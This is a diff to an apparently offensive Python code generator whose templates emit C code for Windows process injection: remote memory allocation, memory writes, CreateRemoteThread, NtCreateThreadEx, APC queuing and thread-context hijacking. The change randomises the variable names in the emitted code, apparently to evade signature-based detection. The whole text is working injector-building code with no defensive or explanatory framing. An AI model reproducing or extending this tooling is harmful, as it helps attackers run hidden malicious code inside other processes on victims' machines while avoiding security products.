@@ -40,9 +40,9 @@ def HeapAlloc(output, dwFlags, dwBytes):
 def NtAllocateVirtualMemory(output, ProcessHandle, RegionSize, AllocationType, PageProtection):
     return Template("""
     PVOID $output = NULL;
-    SIZE_T allocationSize = $RegionSize;
-    {NtAllocateVirtualMemory}($ProcessHandle, &$output, 0, &allocationSize, $AllocationType, $PageProtection);
-""").substitute(output=output, ProcessHandle=ProcessHandle, RegionSize=RegionSize, AllocationType=AllocationType, PageProtection=PageProtection)
+    SIZE_T allocationSize_$n = $RegionSize;
+    {NtAllocateVirtualMemory}($ProcessHandle, &$output, 0, &allocationSize_$n, $AllocationType, $PageProtection);
+""").substitute(output=output, ProcessHandle=ProcessHandle, RegionSize=RegionSize, AllocationType=AllocationType, PageProtection=PageProtection, n=os.urandom(4).hex())
 
 def CreateThread(output, lpStartAddress):
     return Template("""
@@ -62,9 +62,9 @@ def memcpy(destination, source, length):
 
 def NtWriteVirtualMemory(ProcessHandle, destination, source, length):
     return Template("""
-    SIZE_T bytesWritten = 0;
-    {NtWriteVirtualMemory}($ProcessHandle, $destination, $source, $length, &bytesWritten);
-""").substitute(destination=destination,ProcessHandle=ProcessHandle,source=source,length=length)
+    SIZE_T bytesWritten_$n = 0;
+    {NtWriteVirtualMemory}($ProcessHandle, $destination, $source, $length, &bytesWritten_$n);
+""").substitute(destination=destination,ProcessHandle=ProcessHandle,source=source,length=length, n=os.urandom(4).hex())
 
 def WriteProcessMemory(ProcessHandle, destination, source, length):
     return Template("""
@@ -153,7 +153,7 @@ def NtCreateUserProcess(target):
 def CreateRemoteThread(output, hProcess, lpStartAddress, lpParameter='NULL'):
     return Template("""
     HANDLE $output = {CreateRemoteThread}($hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)$lpStartAddress, $lpParameter, 0, NULL);
-""").substitute(output=output, hProcess=hProcess, lpStartAddress=lpStartAddress, lpParameter=lpParameter)
+    """).substitute(output=output, hProcess=hProcess, lpStartAddress=lpStartAddress, lpParameter=lpParameter)
 
 def QueueUserAPC(pfnAPC, hThread):
     return Template("""
@@ -177,11 +177,11 @@ def SetThreadContext(context, hThread):
     {SetThreadContext}($hThread, &$context);
 """).substitute(hThread=hThread, context=context)
 
-def NtCreateThreadEx(output, hProcess, lpStartAddress):
+def NtCreateThreadEx(output, hProcess, lpStartAddress, lpParameter='NULL'):
     return Template("""
     HANDLE $output;
-    {NtCreateThreadEx}(&$output, THREAD_ALL_ACCESS, NULL, $hProcess, (PVOID)$lpStartAddress, NULL, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
-""").substitute(output=output, hProcess=hProcess, lpStartAddress=lpStartAddress)
+    {NtCreateThreadEx}(&$output, THREAD_ALL_ACCESS, NULL, $hProcess, (PVOID)$lpStartAddress, $lpParameter, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
+""").substitute(output=output, hProcess=hProcess, lpStartAddress=lpStartAddress, lpParameter=lpParameter)
 
 def NtQueueApcThread(hThread, pfnAPC):
     return Template("""
